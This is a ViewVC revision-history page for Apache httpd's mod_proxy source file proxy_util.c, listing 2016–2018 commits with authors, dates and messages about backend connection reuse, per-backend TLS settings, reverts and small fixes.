Revision [**1822879**](/viewvc?view=revision&revision=1822879) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1822879&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1822879&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1822879))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1822879)

Modified
*Thu Feb 1 15:01:40 2018 UTC*
(6 years, 11 months ago)
by *ylavic*

File length: 140150 byte(s)

Diff to [previous 1822878](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1822878&r2=1822879)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1822878&r2=1822879&diff_format=h))
```
mod_proxy: follow up to [r1822849](/viewvc?view=revision&revision=1822849) and [r1822878](/viewvc?view=revision&revision=1822878).

Does [r1822878](/viewvc?view=revision&revision=1822878)'s "static" APR_RETRIEVE_OPTIONAL_FN work if, say, mod_proxy is
builtin but mod_http2 isn't?

Not worth taking the risk here since it's not a fast path...

Note: if this is an issue, I'm afraid it applies elsewhere too.

```

---

Revision [**1822878**](/viewvc?view=revision&revision=1822878) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1822878&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1822878&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1822878))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1822878)

Modified
*Thu Feb 1 14:42:07 2018 UTC*
(6 years, 11 months ago)
by *ylavic*

File length: 140336 byte(s)

Diff to [previous 1822858](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1822858&r2=1822878)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1822858&r2=1822878&diff_format=h))
```
mod_proxy: follow up to [r1822849](/viewvc?view=revision&revision=1822849).

Get the help(er) of mod_http2 to determine how much connections should
be handled in the reslist by default (i.e. max_threads).

```

---

Revision [**1822858**](/viewvc?view=revision&revision=1822858) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1822858&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1822858&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1822858))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1822858)

Modified
*Thu Feb 1 08:34:59 2018 UTC*
(6 years, 11 months ago)
by *rpluem*

File length: 139702 byte(s)

Diff to [previous 1822849](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1822849&r2=1822858)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1822849&r2=1822858&diff_format=h))
```
* Add some some comment why we do not limit hmax any longer

```

---

Revision [**1822849**](/viewvc?view=revision&revision=1822849) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1822849&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1822849&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1822849))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1822849)

Modified
*Thu Feb 1 07:34:02 2018 UTC*
(6 years, 11 months ago)
by *rpluem*

File length: 139447 byte(s)

Diff to [previous 1822531](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1822531&r2=1822849)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1822531&r2=1822849&diff_format=h))
```
* When mod_http2 is loaded more then ThreadsPerChild backend connections can
  be useful as mod_http2 has an additional thread pool on top of
  ThreadsPerChild.
  But leave the default with ThreadsPerChild.

```

---

Revision [**1822531**](/viewvc?view=revision&revision=1822531) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1822531&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1822531&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1822531))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1822531)

Modified
*Mon Jan 29 16:41:03 2018 UTC*
(6 years, 11 months ago)
by *ylavic*

File length: 139539 byte(s)

Diff to [previous 1818726](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1818726&r2=1822531)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1818726&r2=1822531&diff_format=h))
```
mod_proxy: fix proxy connection cleanup from an n+2 pool.

When connection_destructor() is called after pchild is gone, we can't
dereference worker->cp anymore. This happens is debug/one_process mode only,
if we exit by calling apr_terminate() or clearing the process pool directly.

Fix this by NULL-ing worker->cp in conn_pool_cleanup(), and by registering it
as a pre_cleanup.

```

---

Revision [**1818726**](/viewvc?view=revision&revision=1818726) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1818726&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1818726&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1818726))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1818726)

Modified
*Tue Dec 19 22:46:27 2017 UTC*
(7 years, 1 month ago)
by *ylavic*

File length: 139852 byte(s)

Diff to [previous 1805188](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1805188&r2=1818726)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1805188&r2=1818726&diff_format=h))
```
mod_proxy: allow SSLProxyCheckPeer* usage for all proxy modules.

PR 61857.

Proposed by: Markus Gausling <markusgausling googlemail.com>
Reviewed by: ylavic

```

---

Revision [**1805188**](/viewvc?view=revision&revision=1805188) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1805188&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1805188&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1805188))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1805188)

Modified
*Wed Aug 16 12:57:41 2017 UTC*
(7 years, 5 months ago)
by *jim*

File length: 139522 byte(s)

Diff to [previous 1775775](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1775775&r2=1805188)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1775775&r2=1805188&diff_format=h))
```
loadfactor now decimal

```

---

Revision [**1775775**](/viewvc?view=revision&revision=1775775) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1775775&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1775775&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1775775))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1775775)

Modified
*Thu Dec 22 23:30:05 2016 UTC*
(8 years, 1 month ago)
by *ylavic*

File length: 139520 byte(s)

Diff to [previous 1756531](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1756531&r2=1775775)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1756531&r2=1775775&diff_format=h))
```
mod_proxy_{ajp,fcgi}: Fix a possible crash when reusing an established
backend connection, happening with LogLevel trace2 or higher configured,
or at any log level with compilers not detected as C99 compliant (e.g.
MSVC on Windows).

```

---

Revision [**1756531**](/viewvc?view=revision&revision=1756531) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1756531&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1756531&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1756531))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1756531)

Modified
*Tue Aug 16 16:21:13 2016 UTC*
(8 years, 5 months ago)
by *ylavic*

File length: 139405 byte(s)

Diff to [previous 1756186](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1756186&r2=1756531)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1756186&r2=1756531&diff_format=h))
```
Follow up to [r1750392](/viewvc?view=revision&revision=1750392): reduce AH03408 level to INFO as suggested by wrowe/jim.

```

---

Revision [**1756186**](/viewvc?view=revision&revision=1756186) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1756186&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1756186&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1756186))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1756186)

Modified
*Fri Aug 12 13:58:10 2016 UTC*
(8 years, 5 months ago)
by *ylavic*

File length: 139408 byte(s)

Diff to [previous 1756065](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1756065&r2=1756186)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1756065&r2=1756186&diff_format=h))
```
[mod_proxy_]http: follow up to [r1750392](/viewvc?view=revision&revision=1750392).

Export [ap_]check_pipeline() and use it also for ap_proxy_check_connection(),
so that all the necessary checks on the connection are done before reusing it.

```

---

Revision [**1756065**](/viewvc?view=revision&revision=1756065) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1756065&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1756065&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1756065))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1756065)

Modified
*Thu Aug 11 23:37:45 2016 UTC*
(8 years, 5 months ago)
by *ylavic*

File length: 138486 byte(s)

Diff to [previous 1756060](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1756060&r2=1756065)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1756060&r2=1756065&diff_format=h))
```
Revert [r1756064](/viewvc?view=revision&revision=1756064) and [r1756060](/viewvc?view=revision&revision=1756060) until fixed (tests framework passes).

```

---

Revision [**1756060**](/viewvc?view=revision&revision=1756060) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1756060&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1756060&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1756060))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1756060)

Modified
*Thu Aug 11 22:32:42 2016 UTC*
(8 years, 5 months ago)
by *ylavic*

File length: 138285 byte(s)

Diff to [previous 1756038](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1756038&r2=1756060)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1756038&r2=1756060&diff_format=h))
```
[mod_proxy_]http: follow up to [r1750392](/viewvc?view=revision&revision=1750392).
Export [ap_]check_pipeline() and use it also for ap_proxy_check_connection().

[Reverted by [r1756065](/viewvc?view=revision&revision=1756065)]

```

---

Revision [**1756038**](/viewvc?view=revision&revision=1756038) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1756038&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1756038&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1756038))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1756038)

Modified
*Thu Aug 11 19:50:02 2016 UTC*
(8 years, 5 months ago)
by *rjung*

File length: 138486 byte(s)

Diff to [previous 1750508](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1750508&r2=1756038)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1750508&r2=1756038&diff_format=h))
```
Fix spelling in comments and text files.
No functional change.
PR 59990

```

---

Revision [**1750508**](/viewvc?view=revision&revision=1750508) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1750508&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1750508&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1750508))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1750508)

Modified
*Tue Jun 28 13:48:44 2016 UTC*
(8 years, 7 months ago)
by *ylavic*

File length: 138483 byte(s)

Diff to [previous 1750474](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1750474&r2=1750508)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1750474&r2=1750508&diff_format=h))
```
mod_proxy: follow up to [r1750392](/viewvc?view=revision&revision=1750392) and [r1750474](/viewvc?view=revision&revision=1750474).
Restore PROXY_WORKER_IS_USABLE() check in ap_proxy_connect_backend(), we must
obviously (un)put backend in error state based on the result of the actual
connect(), and don't change it in ap_proxy_check_backend()...
APR_SUCCESS return by ap_proxy_check_backend(), i.e. a usable worker and an
established connection, is enough for modules to continue w/o calling
ap_proxy_connect_backend(), still.

```

---

Revision [**1750474**](/viewvc?view=revision&revision=1750474) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1750474&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1750474&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1750474))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1750474)

Modified
*Tue Jun 28 11:19:36 2016 UTC*
(8 years, 7 months ago)
by *ylavic*

File length: 138123 byte(s)

Diff to [previous 1750416](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1750416&r2=1750474)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1750416&r2=1750474&diff_format=h))
```
mod_proxy: follow up to [r1750392](/viewvc?view=revision&revision=1750392).
Avoid double checking the connection in ap_proxy_connect_backend() when
ap_proxy_check_backend() says it is up and good to go.

This can be done by moving the PROXY_WORKER_IS_USABLE() check in
ap_proxy_check_backend(), since it is called by ap_proxy_connect_backend(),
and not calling the latter if the former succeeded (for the modules using it).

```

---

Revision [**1750416**](/viewvc?view=revision&revision=1750416) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1750416&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1750416&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1750416))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1750416)

Modified
*Mon Jun 27 21:49:15 2016 UTC*
(8 years, 7 months ago)
by *ylavic*

File length: 138132 byte(s)

Diff to [previous 1750412](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1750412&r2=1750416)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1750412&r2=1750416&diff_format=h))
```
mod_proxy: we don't need ap_proxy_ssl_connection_cleanup() anymore with
ap_proxy_check_backend() used at connection reuse time, so remove its last call and deprecate it.

```

---

Revision [**1750412**](/viewvc?view=revision&revision=1750412) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1750412&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1750412&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1750412))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1750412)

Modified
*Mon Jun 27 21:39:53 2016 UTC*
(8 years, 7 months ago)
by *ylavic*

File length: 138115 byte(s)

Diff to [previous 1750392](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1750392&r2=1750412)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1750392&r2=1750412&diff_format=h))
```
mod_proxy: use proxy_conn_rec->tmp_bb where appopriate to avoid temporary
brigade create/destroy.

```

---

Revision [**1750392**](/viewvc?view=revision&revision=1750392) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1750392&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1750392&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1750392))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1750392)

Modified
*Mon Jun 27 17:26:12 2016 UTC*
(8 years, 7 months ago)
by *ylavic*

File length: 138197 byte(s)

Diff to [previous 1750376](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1750376&r2=1750392)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1750376&r2=1750392&diff_format=h))
```
mod_proxy_{http,ajp,fcgi}}: don't reuse backend connections with data available
before the request is sent.  PR 57832.

ap_proxy_check_backend() can be used before ap_proxy_connect_backend() to try
to read available data (including from the filters), and is called by
ap_proxy_connect_backend() to check the socket state only (as before, still
relevant after ap_proxy_check_backend() due to filter data which may not have
triggered a real socket operation).

```

---

Revision [**1750376**](/viewvc?view=revision&revision=1750376) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1750376&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1750376&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1750376))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1750376)

Modified
*Mon Jun 27 16:06:42 2016 UTC*
(8 years, 7 months ago)
by *ylavic*

File length: 136731 byte(s)

Diff to [previous 1750311](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1750311&r2=1750376)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1750311&r2=1750376&diff_format=h))
```
mod_proxy: revert [r1750301](/viewvc?view=revision&revision=1750301), [r1750305](/viewvc?view=revision&revision=1750305) and [r1750311](/viewvc?view=revision&revision=1750311).
Rework needed.

```

---

Revision [**1750311**](/viewvc?view=revision&revision=1750311) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1750311&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1750311&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1750311))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1750311)

Modified
*Mon Jun 27 08:20:39 2016 UTC*
(8 years, 7 months ago)
by *ylavic*

File length: 138120 byte(s)

Diff to [previous 1750305](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1750305&r2=1750311)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1750305&r2=1750311&diff_format=h))
```
mod_proxy: follow up to [r1750301](/viewvc?view=revision&revision=1750301): APLOGNO().

[Reverted by [r1750376](/viewvc?view=revision&revision=1750376)]

```

---

Revision [**1750305**](/viewvc?view=revision&revision=1750305) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1750305&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1750305&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1750305))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1750305)

Modified
*Mon Jun 27 08:08:26 2016 UTC*
(8 years, 7 months ago)
by *ylavic*

File length: 138115 byte(s)

Diff to [previous 1750301](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1750301&r2=1750305)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1750301&r2=1750305&diff_format=h))
```
mod_proxy: follow up to [r1750301](/viewvc?view=revision&revision=1750301).
s/is_socket_connected/get_socket_connected/ in the !USE_ALTERNATE_IS_CONNECTED
case, and add CHANGE + MMN entries.

[Reverted by [r1750376](/viewvc?view=revision&revision=1750376)]

```

---

Revision [**1750301**](/viewvc?view=revision&revision=1750301) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1750301&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1750301&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1750301))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1750301)

Modified
*Mon Jun 27 08:00:30 2016 UTC*
(8 years, 7 months ago)
by *ylavic*

File length: 138115 byte(s)

Diff to [previous 1747807](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1747807&r2=1750301)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1747807&r2=1750301&diff_format=h))
```
mod_proxy: don't reuse backend connections with data available before the
request is sent.  PR 57832.

[Reverted by [r1750376](/viewvc?view=revision&revision=1750376)]

```

---

Revision [**1747807**](/viewvc?view=revision&revision=1747807) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1747807&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1747807&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1747807))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1747807)

Modified
*Fri Jun 10 22:12:55 2016 UTC*
(8 years, 7 months ago)
by *jailletc36*

File length: 136731 byte(s)

Diff to [previous 1747469](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1747469&r2=1747807)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1747469&r2=1747807&diff_format=h))
```
When  ap_proxy_show_hcmethod has been backported in 2.4.x ([r1744951](/viewvc?view=revision&revision=1744951)) the function has not been placed at the same position in the code (see [r1725306](/viewvc?view=revision&revision=1725306)).

Move it at the same place in oder to synch 2.4.x and trunk.

```

---

Revision [**1747469**](/viewvc?view=revision&revision=1747469) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1747469&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1747469&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1747469))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1747469)

Modified
*Thu Jun 9 00:06:42 2016 UTC*
(8 years, 7 months ago)
by *wrowe*

File length: 136731 byte(s)

Diff to [previous 1740928](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1740928&r2=1747469)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1740928&r2=1747469&diff_format=h))
```
Rename ap_casecmpstr[n]() to ap_cstr_casecmp[n](), update with APR doxygen

```

---

Revision [**1740928**](/viewvc?view=revision&revision=1740928) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1740928&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1740928&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1740928))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1740928)

Modified
*Tue Apr 26 00:04:57 2016 UTC*
(8 years, 9 months ago)
by *ylavic*

File length: 136695 byte(s)

Diff to [previous 1733239](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1733239&r2=1740928)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1733239&r2=1740928&diff_format=h))
```
mod_proxy, mod_ssl: Handle SSLProxy* directives in <Proxy> sections,
allowing per backend TLS configuration.

```

---

Revision [**1733239**](/viewvc?view=revision&revision=1733239) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1733239&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1733239&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1733239))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1733239)

Modified
*Wed Mar 2 09:51:05 2016 UTC*
(8 years, 10 months ago)
by *icing*

File length: 135991 byte(s)

Diff to [previous 1733056](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1733056&r2=1733239)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1733056&r2=1733239&diff_format=h))
```
adding default port numbers for h2/h2x proxy schemes, by jchampion

```

---

Revision [**1733056**](/viewvc?view=revision&revision=1733056) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1733056&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1733056&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1733056))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1733056)

Modified
*Tue Mar 1 12:35:01 2016 UTC*
(8 years, 10 months ago)
by *ylavic*

File length: 135916 byte(s)

Diff to [previous 1733055](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1733055&r2=1733056)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1733055&r2=1733056&diff_format=h))
```
mod_proxy: follow up to [r1729826](/viewvc?view=revision&revision=1729826) + [r1729847](/viewvc?view=revision&revision=1729847) + [r1732986](/viewvc?view=revision&revision=1732986).
Don't use magic constants.

```

---

Revision [**1733055**](/viewvc?view=revision&revision=1733055) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1733055&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1733055&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1733055))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1733055)

Modified
*Tue Mar 1 12:33:50 2016 UTC*
(8 years, 10 months ago)
by *ylavic*

File length: 135933 byte(s)

Diff to [previous 1733054](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1733054&r2=1733055)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1733054&r2=1733055&diff_format=h))
```
Revert [r1733054](/viewvc?view=revision&revision=1733054): spurious commit of being-worked mod_reqtimeout changes.

```

---

Revision [**1733054**](/viewvc?view=revision&revision=1733054) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1733054&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1733054&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1733054))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1733054)

Modified
*Tue Mar 1 12:31:40 2016 UTC*
(8 years, 10 months ago)
by *ylavic*

File length: 135916 byte(s)

Diff to [previous 1732986](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1732986&r2=1733054)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1732986&r2=1733054&diff_format=h))
```
mod_proxy: follow up to [r1729826](/viewvc?view=revision&revision=1729826) + [r1729847](/viewvc?view=revision&revision=1729847) + [r1732986](/viewvc?view=revision&revision=1732986).
Don't use magic constants.

Reverted by [r1733055](/viewvc?view=revision&revision=1733055), re-commited without spurious changes in [r1733056](/viewvc?view=revision&revision=1733056).

```

---

Revision [**1732986**](/viewvc?view=revision&revision=1732986) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1732986&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1732986&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1732986))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1732986)

Modified
*Tue Mar 1 01:20:06 2016 UTC*
(8 years, 10 months ago)
by *ylavic*

File length: 135933 byte(s)

